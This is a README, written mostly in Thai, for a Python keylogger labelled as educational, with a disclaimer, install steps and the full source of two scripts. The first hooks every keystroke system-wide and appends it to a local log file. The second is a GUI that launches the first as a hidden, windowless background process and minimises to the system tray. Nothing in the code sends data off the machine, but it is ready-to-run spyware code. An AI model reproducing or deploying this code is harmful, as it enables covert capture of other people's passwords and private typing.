# Keylogger เพื่อการศึกษา (Educational Keylogger)

![Python](https://img.shields.io/badge/python-3.8+-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

โปรเจกต์นี้เป็น Keylogger พื้นฐานที่สร้างขึ้นด้วยภาษา Python เพื่อสาธิตวิธีการดักจับและบันทึกการกดแป้นพิมพ์ โปรเจกต์นี้มีวัตถุประสงค์เพื่อการศึกษาและทำความเข้าใจหลักการทำงานของซอฟต์แวร์ประเภทนี้เท่านั้น

## ⚠️ คำเตือนและข้อจำกัดความรับผิดชอบ

โปรเจกต์นี้สร้างขึ้นเพื่อ **วัตถุประสงค์ทางการศึกษาเท่านั้น** **ห้าม** นำไปใช้ในทางที่ผิดกฎหมายหรือละเมิดความเป็นส่วนตัวของผู้อื่นโดยเด็ดขาด ผู้พัฒนาไม่มีส่วนรับผิดชอบต่อความเสียหายใด ๆ ที่เกิดจากการนำโค้ดนี้ไปใช้งานในทางที่ผิด

---

## เกี่ยวกับโปรเจกต์

โปรเจกต์นี้ประกอบด้วย 2 ส่วนหลัก:
1.  **`keylogger.py`**: สคริปต์หลักที่ทำงานเบื้องหลัง ทำหน้าที่ดักจับการกดแป้นพิมพ์ทั้งหมด (Keystroke) และบันทึกลงในไฟล์ `key_log.txt`
2.  **`keylogger_gui.py`**: โปรแกรมส่วนหน้า (GUI) ที่ใช้ `Tkinter` สำหรับควบคุมการทำงานของ Keylogger ทำให้ผู้ใช้สามารถสั่ง เริ่ม, หยุด และดูสถานะได้อย่างง่ายดาย

## ✨ คุณสมบัติหลัก

-   **บันทึกการกดปุ่ม**: สามารถบันทึกการกดปุ่มตัวอักษร, ตัวเลข, และปุ่มพิเศษ (เช่น Enter, Shift, Backspace) ได้
-   **รองรับภาษาไทย**: บันทึกตัวอักษรภาษาไทยได้อย่างถูกต้อง
-   **GUI สำหรับควบคุม**: มีหน้าต่างสำหรับสั่งเริ่ม/หยุดการทำงานของ Keylogger
-   **แสดงสถานะ**: บอกสถานะการทำงานปัจจุบัน (กำลังทำงาน / ไม่ทำงาน) พร้อม Process ID (PID)
-   **ทำงานใน System Tray**: สามารถย่อหน้าต่างโปรแกรมลงไปเก็บไว้ใน System Tray ได้ เพื่อไม่ให้รบกวนการทำงานบนหน้าจอหลัก

## 🖼️ ภาพหน้าจอ (Screenshots)

นี่คือตัวอย่างหน้าตาของโปรแกรมและผลลัพธ์การทำงาน

| หน้าต่างควบคุม (สถานะ: หยุดทำงาน) | หน้าต่างควบคุม (สถานะ: กำลังทำงาน) |
| :------------------------------: | :--------------------------------: |
| <!-- Placeholder for image 1: GUI stopped --> <img src="https://img5.pic.in.th/file/secure-sv1/Screenshot-2025-07-29-003251.png" alt="GUI Stopped" width="350"> | <!-- Placeholder for image 2: GUI running --> <img src="https://img2.pic.in.th/pic/Screenshot-2025-07-29-003347.png" alt="GUI Running" width="350"> |

| ตัวอย่างไฟล์ Log | ไอคอนใน System Tray | กล่องข้อความแจ้งเตือน |
| :---------------------------: | :-----------------: | :-----------------: |
| <!-- Placeholder for image 3: Log file example --> <img src="https://img2.pic.in.th/pic/Screenshot-2025-07-29-003530.png" alt="Log File Example" width="350"> | <!-- Placeholder for image 4: Tray icon --> <img src="https://cdn-icons-png.flaticon.com/128/4616/4616403.png" alt="System Tray Icon" width="350"> | <!-- Placeholder for image 5: Message box --> <img src="https://img5.pic.in.th/file/secure-sv1/Screenshot-2025-07-29-003557.png" alt="Message Box" width="350"> |


## ⚙️ สิ่งที่ต้องมี (Prerequisites)

คุณต้องติดตั้งไลบรารีของ Python ที่จำเป็นก่อน โดยใช้คำสั่ง:

```bash
pip install keyboard pystray Pillow psutil requests
```

หรือสร้างไฟล์ `requirements.txt` ตามเนื้อหานี้ แล้วติดตั้งผ่านคำสั่ง `pip install -r requirements.txt`

**`requirements.txt`:**
```txt
keyboard
pystray
Pillow
psutil
requests
```

## 🚀 การติดตั้งและใช้งาน

1.  **Clone repository นี้:**
    ```bash
    git clone https://github.com/your-username/your-repository-name.git
    ```
2.  **เข้าไปในโฟลเดอร์ของโปรเจกต์:**
    ```bash
    cd your-repository-name
    ```
3.  **ติดตั้งไลบรารีที่จำเป็น:**
    ```bash
    pip install -r requirements.txt
    ```
4.  **รันโปรแกรม GUI:**
    ```bash
    python keylogger_gui.py
    ```
5.  ใช้ปุ่มในหน้าต่างโปรแกรมเพื่อควบคุมการทำงาน:
    -   **เริ่ม Keylogger**: เพื่อเริ่มการบันทึก
    -   **หยุด Keylogger**: เพื่อหยุดการบันทึก
    -   **บันทึก Log**: จะมีข้อความยืนยันว่าไฟล์ `key_log.txt` ถูกสร้างขึ้นแล้ว และคุณสามารถเปิดดูได้ในโฟลเดอร์เดียวกับโปรแกรม

## 📝 โค้ด

### `keylogger.py` (สคริปต์หลักสำหรับดักจับคีย์บอร์ด)
สคริปต์นี้ใช้ไลบรารี `keyboard` เพื่อดักจับ Event การกดปุ่ม และบันทึกข้อมูลลงในไฟล์ `key_log.txt` อย่างต่อเนื่อง

```python
import keyboard

log_file = "key_log.txt"

def on_key_event(event):
    if event.event_type != "down":
        return  # สนใจเฉพาะตอนกดปุ่มลง

    key = event.name
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            # ตัวอักษรธรรมดา (ไทย/อังกฤษ)
            if len(key) == 1:
                f.write(key)
            # ปุ่มพิเศษ
            elif key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            elif key == "tab":
                f.write("\t")
            elif key == "backspace":
                f.write("[BACKSPACE]")
            elif key == "shift":
                pass  # ไม่ต้องบันทึก Shift แยก
            else:
                f.write(f"[{key.upper()}]")
    except:
        pass  # กันไว้เผื่อเครื่องบางเครื่องเจอ error กับปุ่มพิเศษ

keyboard.hook(on_key_event)
keyboard.wait()
```

### `keylogger_gui.py` (หน้าต่างควบคุม GUI)
สคริปต์นี้สร้างหน้าต่างควบคุมด้วย `Tkinter` และใช้ `psutil` ในการจัดการ Process ของ `keylogger.py` รวมถึงใช้ `pystray` เพื่อสร้างไอคอนใน System Tray

```python
import tkinter as tk
from tkinter import messagebox
import psutil, shutil, subprocess, os, signal
from PIL import Image, ImageDraw
import pystray
import threading
import requests
from io import BytesIO

KEYLOGGER_NAME = "keylogger.py"
LOG_FILE = "key_log.txt"

def load_icon_image():
    try:
        url = "https://cdn-icons-png.flaticon.com/128/4616/4616403.png"
        response = requests.get(url, timeout=5)
        image = Image.open(BytesIO(response.content)).convert("RGBA")
        return image.resize((64, 64))
    except Exception as e:
        print(f"โหลด icon ไม่สำเร็จ: {e}")
        image = Image.new('RGB', (64, 64), color="#2c2f33")
        draw = ImageDraw.Draw(image)
        draw.rectangle((16, 16, 48, 48), fill="#00ff88")
        return image

def check_process_running(script_name):
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = proc.info.get('cmdline')
            if cmdline and script_name in cmdline:
                return proc
        except:
            continue
    return None

def start_keylogger():
    if not check_process_running(KEYLOGGER_NAME):
        subprocess.Popen(["pythonw", KEYLOGGER_NAME], creationflags=subprocess.CREATE_NO_WINDOW) # ใช้ pythonw เพื่อไม่ให้มีหน้าต่าง cmd
        messagebox.showinfo("เริ่มต้น", "เริ่มต้น Keylogger แล้ว")
    else:
        messagebox.showinfo("ทำงานอยู่แล้ว", "Keylogger กำลังทำงานอยู่แล้ว")
    refresh_status()

def stop_keylogger():
    proc = check_process_running(KEYLOGGER_NAME)
    if proc:
        try:
            os.kill(proc.pid, signal.SIGTERM)
            messagebox.showinfo("หยุด", "หยุดการทำงานของ Keylogger แล้ว")
        except Exception as e:
            messagebox.showerror("ผิดพลาด", f"ไม่สามารถหยุดได้: {e}")
    else:
        messagebox.showinfo("ไม่พบ", "Keylogger ไม่ได้ทำงานอยู่")
    refresh_status()

def save_log():
    if os.path.exists(LOG_FILE):
        messagebox.showinfo("สำเร็จ", f"บันทึกแล้วใน '{LOG_FILE}'")
    else:
        messagebox.showerror("ผิดพลาด", "ไม่พบไฟล์ key_log.txt")

def refresh_status():
    proc = check_process_running(KEYLOGGER_NAME)
    if proc:
        status_label.config(text=f"🟢 กำลังทำงาน (PID: {proc.pid})", fg="#00ff88")
    else:
        status_label.config(text="🔴 ไม่ทำงาน", fg="#ff5555")

# ---------------------- GUI -----------------------
app = tk.Tk()
app.title("Keylogger Monitor")
app.geometry("360x320")
app.configure(bg="#1e1e1e")
app.resizable(False, False)

try:
    font_main = ("Tahoma", 14)
except:
    font_main = ("Tahoma", 12)
btn_style = {"font": font_main,"bg": "#2c2f33","fg": "white","activebackground": "#3a3d41","bd": 0}

title_label = tk.Label(app, text="Keylogger Monitor", font=("Tahoma", 16, "bold"), bg="#1e1e1e", fg="white")
title_label.pack(pady=10)

status_label = tk.Label(app, text="", font=font_main, bg="#1e1e1e")
status_label.pack(pady=10)

tk.Button(app, text="เริ่ม Keylogger", width=25, command=start_keylogger, **btn_style).pack(pady=6)
tk.Button(app, text="หยุด Keylogger", width=25, command=stop_keylogger, **btn_style).pack(pady=6)
tk.Button(app, text="รีเฟรชสถานะ", width=25, command=refresh_status, **btn_style).pack(pady=6)
tk.Button(app, text="บันทึก Log", width=25, command=save_log, **btn_style).pack(pady=6)

for btn in app.winfo_children():
    if isinstance(btn, tk.Button):
        btn.bind("<Enter>", lambda e, b=btn: b.config(bg="#40444b"))
        btn.bind("<Leave>", lambda e, b=btn: b.config(bg="#2c2f33"))

# ---------------------- System Tray -----------------------
tray_icon = None

def hide_window():
    app.withdraw()

def show_window(icon=None, item=None):
    app.after(0, app.deiconify)

def quit_app(icon=None, item=None):
    stop_keylogger() # หยุดการทำงานของ keylogger ก่อนปิด
    if tray_icon:
        tray_icon.stop()
    app.quit()

def setup_tray():
    global tray_icon
    icon_image = load_icon_image()
    menu = pystray.Menu(
        pystray.MenuItem("แสดงหน้าต่าง", show_window, default=True),
        pystray.MenuItem("ออกจากโปรแกรม", quit_app)
    )
    tray_icon = pystray.Icon("KeyloggerMonitor", icon_image, "Keylogger Monitor", menu)
    tray_icon.run()

def on_close():
    hide_window() # เปลี่ยนจากการปิดเป็นการซ่อนแทน

app.protocol("WM_DELETE_WINDOW", on_close)

# Start tray thread
threading.Thread(target=setup_tray, daemon=True).start()

refresh_status()
app.mainloop()

```
